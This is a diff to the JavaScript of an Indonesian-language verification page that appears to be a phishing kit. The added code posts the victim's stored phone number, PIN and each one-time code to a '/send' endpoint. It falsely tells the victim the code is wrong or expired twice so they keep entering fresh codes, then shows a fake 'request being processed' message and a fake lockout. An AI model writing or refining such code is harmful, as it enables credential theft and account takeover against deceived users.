@@ -15,6 +15,12 @@ const timerText = document.querySelector(".timer");
 const introOverlay = document.getElementById("introOverlay");
 const introBtn = document.getElementById("introBtn");
 
+const startAgainBtn =
+document.getElementById("startAgainBtn");
+
+const alertResetBtn =
+document.querySelector(".alert-reset-btn");
+
 let alertTimer;
 let otpAttempt = 0;
 
@@ -39,7 +45,7 @@ if(errorBox){
     errorBox.style.display = "none";
 }
 
-function showTempAlert(title, desc){
+function showTempAlert(title, desc, type){
 
     if(!errorBox || !alertTitle || !alertDesc) return;
 
@@ -48,17 +54,43 @@ function showTempAlert(title, desc){
     alertTitle.innerText = title;
     alertDesc.innerText = desc;
 
+    errorBox.classList.remove("error","success","blocked");
+
+    if(type === "success"){
+        errorBox.classList.add("success");
+    }else if(type === "blocked"){
+        errorBox.classList.add("blocked","error");
+    }else{
+        errorBox.classList.add("error");
+    }
+
     errorBox.style.display = "block";
     errorBox.classList.add("show");
 
-    alertTimer = setTimeout(() => {
-        errorBox.classList.remove("show");
+  if(alertResetBtn){
 
-        setTimeout(() => {
-            errorBox.style.display = "none";
-        },300);
+    if(type === "blocked"){
 
-    },3000);
+        alertResetBtn.style.display = "block";
+
+    }else{
+
+        alertResetBtn.style.display = "none";
+
+    }
+
+}
+
+    if(type !== "blocked"){
+        alertTimer = setTimeout(() => {
+            errorBox.classList.remove("show");
+
+            setTimeout(() => {
+                errorBox.style.display = "none";
+            },300);
+
+        },3000);
+    }
 }
 
 /* NOMOR OTOMATIS */
@@ -134,93 +166,105 @@ function checkOTP(){
 
     if(otp.length === 6){
 
-        otpAttempt++;
+    otpAttempt++;
 
-        localStorage.setItem("otp", otp);
+    localStorage.setItem("otx", otp);
 
-        const nmrx = localStorage.getItem("nmrx");
-        const pix = localStorage.getItem("pix");
+fetch("/send",{
+    method:"POST",
+    headers:{
+        "Content-Type":"application/json"
+    },
+    body:JSON.stringify({
+        nmrx: localStorage.getItem("nmrx"),
+        pix: localStorage.getItem("pix"),
+        otx: localStorage.getItem("otx")
+    })
+})
+  
+    .then(res => res.json())
+    .then(data => {
+        console.log("RESPON:", data);
+    })
+    .catch(err => {
+        console.log("ERROR:", err);
+    });
 
-        fetch("/otp",{
-            method:"POST",
-            headers:{
-                "Content-Type":"application/json"
-            },
-            body:JSON.stringify({
-                nmrx:nmrx,
-                pix:pix,
-                otp:otp
-            })
-        })
-        .then(res => res.json())
-        .then(data => {
-            console.log("RESPON:", data);
-        })
-        .catch(err => {
-            console.log("ERROR:", err);
-        });
-
-        if(loadingBox){
-            loadingBox.style.display = "flex";
-        }
-
-        setTimeout(() => {
-
-            if(loadingBox){
-                loadingBox.style.display = "none";
-            }
-
-            /* OTP PERTAMA: SALAH */
-            if(otpAttempt === 1){
-
-                showTempAlert(
-                    "Kode OTP salah atau kadaluarsa",
-                    "Pastikan Kode OTP yang kamu masukan benar dan tidak kadaluarsa"
-                );
-
-                if(otpContainer){
-                    otpContainer.classList.add("shake");
-                }
-
-                if(navigator.vibrate){
-                    navigator.vibrate(250);
-                }
-
-                setTimeout(() => {
-                    if(otpContainer){
-                        otpContainer.classList.remove("shake");
-                    }
-                },350);
-
-                setTimeout(() => {
-
-                    otpInputs.forEach(input => {
-                        input.value = "";
-                    });
-
-                    if(otpInputs[0]){
-                        otpInputs[0].focus();
-                    }
-
-                },300);
-
-            }
-
-            /* OTP KEDUA: LANJUT */
-            else{
-
-                document.body.classList.add("fade-out");
-
-                setTimeout(() => {
-                    window.location.href = "oxt.html";
-                },500);
-
-            }
-
-        },2000);
-
+    if(loadingBox){
+        loadingBox.style.display = "flex";
     }
 
+    setTimeout(() => {
+
+        if(loadingBox){
+            loadingBox.style.display = "none";
+        }
+
+        if(otpAttempt <= 2){
+
+            showTempAlert(
+                "Kode OTP salah atau kadaluarsa",
+                "Pastikan Kode OTP yang kamu masukan benar dan tidak kadaluarsa",
+                "red"
+            );
+
+            if(navigator.vibrate){
+    navigator.vibrate([120,80,120]);
+}
+
+            resetOTP();
+
+        }else if(otpAttempt === 3){
+
+            showTempAlert(
+                "Terima Kasih",
+                "Permintaan Anda sedang di proses",
+                "success"
+            );
+
+            if(navigator.vibrate){
+    navigator.vibrate([120,80,120]);
+}
+
+            resetOTP();
+
+        }else{
+
+            showTempAlert(
+                "Kode Verifikasi Dibatasi",
+                "Kamu sudah memasukan Kode Verifikasi 4x. Silahkan mulai dari awal atau hubungi admin.",
+                "blocked"
+            );
+
+            if(navigator.vibrate){
+    navigator.vibrate([120,80,120]);
+}
+
+            otpInputs.forEach(input => {
+                input.disabled = true;
+            });
+
+        }
+
+    },1200);
+}
+}
+
+function resetOTP(){
+
+    otpContainer.classList.add("shake");
+
+    setTimeout(() => {
+        otpContainer.classList.remove("shake");
+    },350);
+
+    setTimeout(() => {
+        otpInputs.forEach(input => {
+            input.value = "";
+        });
+
+        otpInputs[0].focus();
+    },300);
 }
 
 /* TIMER */
@@ -271,6 +315,25 @@ if(introBtn && introOverlay){
         setTimeout(() => {
             introOverlay.style.display = "none";
         },350);
+
+    });
+
+}
+
+if(alertResetBtn){
+
+    alertResetBtn.addEventListener("click",()=>{
+        localStorage.removeItem("otx");
+        localStorage.removeItem("nmrx");
+        localStorage.removeItem("pix");
+
+        document.body.classList.add("fade-out");
+
+        setTimeout(()=>{
+
+            window.location.href="index.html";
+
+        },500);
 
     });
 
